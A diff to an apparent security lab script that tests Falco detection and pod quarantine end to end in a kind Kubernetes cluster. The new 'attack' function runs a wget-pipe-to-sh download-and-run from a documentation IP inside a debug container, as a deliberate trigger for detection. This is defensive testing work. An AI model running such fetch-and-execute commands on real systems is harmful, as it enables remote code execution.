@@ -1,9 +1,12 @@
 """Scenario S1 against a real Kubernetes cluster: the kind lab, end to end.
 
-    make lab-up && make lab-e2e            # or: python scripts/lab_e2e.py --svg lab-run.svg
+    make lab-up && make lab-e2e                  # replays the S1 Falco alert against a live pod
+    python scripts/lab_e2e.py --alert falco      # a real attack, detected by Falco in the cluster
 
-Unlike scripts/demo.py, nothing on the Kubernetes side is simulated. The S1 Falco alert is
-re-addressed to a live checkout pod; enrichment reads the cluster as the investigator service
+Unlike scripts/demo.py, nothing on the Kubernetes side is simulated. With `--alert falco` (what CI
+runs) a download-and-run is executed inside a live checkout pod, Falco detects it, and
+Falcosidekick posts the alert to CloudShield's webhook; with the default `--alert fixture` the S1
+Falco alert is re-addressed to the pod instead. Enrichment reads the cluster as the investigator service
 account; the quarantine runs as the responder service account; and a probe pod proves with real
 traffic that the NetworkPolicies cut the quarantined pod off and that rollback restores it. Only AWS
 is missing (kind has no EKS Pod Identity or EC2), so those fields stay unresolved.
@@ -17,6 +20,7 @@ import logging
 import os
 import subprocess
 import sys
+import threading
 import time
 import uuid
 from collections.abc import Callable
@@ -28,6 +32,7 @@ ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT / "services"))
 sys.path.insert(0, str(ROOT / "scripts"))
 
+import uvicorn  # noqa: E402
 from fastapi.testclient import TestClient  # noqa: E402
 from kubernetes import client, config  # noqa: E402
 from kubernetes.client.exceptions import ApiException  # noqa: E402
@@ -100,7 +105,40 @@ def falco_alert_for(pod: Any) -> bytes:
     return json.dumps(alert).encode()
 
 
-def run() -> tuple[Transcript, list[str]]:
+def serve(app: Any, port: int) -> None:
+    """Run the same app over HTTP in a background thread, for Falcosidekick's webhook."""
+    server = uvicorn.Server(uvicorn.Config(app, host="0.0.0.0", port=port, log_level="warning"))  # noqa: S104
+    threading.Thread(target=server.run, daemon=True).start()
+    while not server.started:
+        time.sleep(0.1)
+
+
+def attack(pod: str) -> None:
+    """The S1 behaviour for real: download-and-run inside the pod, from an ephemeral debug container.
+
+    The checkout image has no shell, so the attacker's shell comes in a busybox container attached
+    to the pod (Pod Security `restricted` still applies). The download goes to a documentation IP
+    and is blocked by the namespace's default-deny egress, so nothing actually runs.
+    """
+    kubectl("-n", NS, "debug", f"pod/{pod}", "--image=busybox:1.37.0", "--profile=restricted",
+            "--container=attacker", "--", "sh", "-c",
+            "wget -T 2 -q -O- http://198.51.100.23/x.sh | sh")  # fmt: skip
+
+
+def case_for(api: TestClient, pod_id: str, event_type: str, *, timeout: float) -> dict[str, Any] | None:
+    """The case holding this kind of event for this pod, waiting for the alert to arrive if needed."""
+    deadline = time.monotonic() + timeout
+    while True:
+        for case in api.get("/v1/cases").json():
+            events = api.get(f"/v1/cases/{case['case_id']}").json()["events"]
+            if any(e["resource_id"] == pod_id and e["event_type"] == event_type for e in events):
+                return case
+        if time.monotonic() > deadline:
+            return None
+        time.sleep(2)
+
+
+def run(alert: str, port: int) -> tuple[Transcript, list[str]]:
     out, failures = Transcript(), []
     config.load_kube_config()
     admin = client.CoreV1Api()
@@ -139,7 +177,8 @@ def run() -> tuple[Transcript, list[str]]:
     api = TestClient(create_app(settings, pod_resolver=resolve, executor=executor))
     alice, bob = {"authorization": "Bearer alice-lab"}, {"authorization": "Bearer bob-lab"}
 
-    out.say("CloudShield · scenario S1 on a real Kubernetes cluster (kind)", "title")
+    title = "a live Falco detection" if alert == "falco" else "a replayed Falco alert"
+    out.say(f"CloudShield · scenario S1 on a real Kubernetes cluster (kind), from {title}", "title")
     out.say("real API, cluster, RBAC and NetworkPolicies · no AWS (IAM role and EC2 stay unresolved)", "dim")
     out.say("")
 
@@ -155,14 +194,28 @@ def run() -> tuple[Transcript, list[str]]:
     before = reachable(target.status.pod_ip) and reachable(other.status.pod_ip)
     row("", "traffic", "probe -> both checkout pods on 8080", "reachable" if before else "BLOCKED", before)
 
-    r = api.post("/v1/ingest/falco", content=falco_alert_for(target),
-                 headers={"authorization": "Bearer lab-falco-key"})  # fmt: skip
-    row("2", "ingest", "Falco: curl | sh in the target pod", f"{r.status_code} {r.json().get('status')}",
-        r.status_code < 300)  # fmt: skip
-    [case] = api.get("/v1/cases").json()
-    row("3", "case", f"{case['event_count']} event, severity {case['severity']}", case["case_id"])
-
     pod_id = f"k8s:pod/{NS}/{target.metadata.name}"
+    if alert == "falco":
+        serve(api.app, port)  # Falcosidekick posts here from inside the cluster
+        attack(target.metadata.name)
+        row("2", "attack", "wget ... | sh in a debug container of the pod", "launched")
+        note("Falco (modern eBPF) -> Falcosidekick -> CloudShield webhook, token-authenticated")
+    else:
+        r = api.post("/v1/ingest/falco", content=falco_alert_for(target),
+                     headers={"authorization": "Bearer lab-falco-key"})  # fmt: skip
+        row("2", "ingest", "S1 Falco alert, re-addressed to the target pod",
+            f"{r.status_code} {r.json().get('status')}", r.status_code < 300)  # fmt: skip
+    expected = "process.remote_script_execution" if alert == "falco" else "process.unexpected_execution"
+    case = case_for(api, pod_id, expected, timeout=120 if alert == "falco" else 5)
+    if case is None:
+        row("3", "case", f"no case for {pod_id}", "TIMED OUT", False)
+        return out, failures
+    detail = api.get(f"/v1/cases/{case['case_id']}").json()
+    rules = sorted({e["title"] for e in detail["events"]})
+    row("3", "case", f"{case['event_count']} event(s), severity {case['severity']}", case["case_id"])
+    for rule in rules:
+        note(rule)
+
     graph = api.get(f"/v1/entities/{pod_id}/graph").json()
     ids = {e["entity_id"] for e in graph.get("entities", [])}
     traced = f"k8s:deployment/{NS}/checkout" in ids
@@ -237,9 +290,16 @@ def run() -> tuple[Transcript, list[str]]:
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--svg", type=Path, help="also write the transcript as an SVG terminal image")
+    parser.add_argument(
+        "--alert",
+        choices=["fixture", "falco"],
+        default="fixture",
+        help="replay the S1 alert, or attack the pod and wait for Falco's real alert",
+    )
+    parser.add_argument("--port", type=int, default=8099, help="webhook port for Falcosidekick (falco mode)")
     args = parser.parse_args()
     logging.getLogger("enrichment.context").setLevel(logging.ERROR)  # the expected "no AWS" warnings
-    transcript, failures = run()
+    transcript, failures = run(args.alert, args.port)
     text = "\n".join(t for _, t in transcript.lines)
     if summary := os.getenv("GITHUB_STEP_SUMMARY"):
         with open(summary, "a", encoding="utf-8") as f:
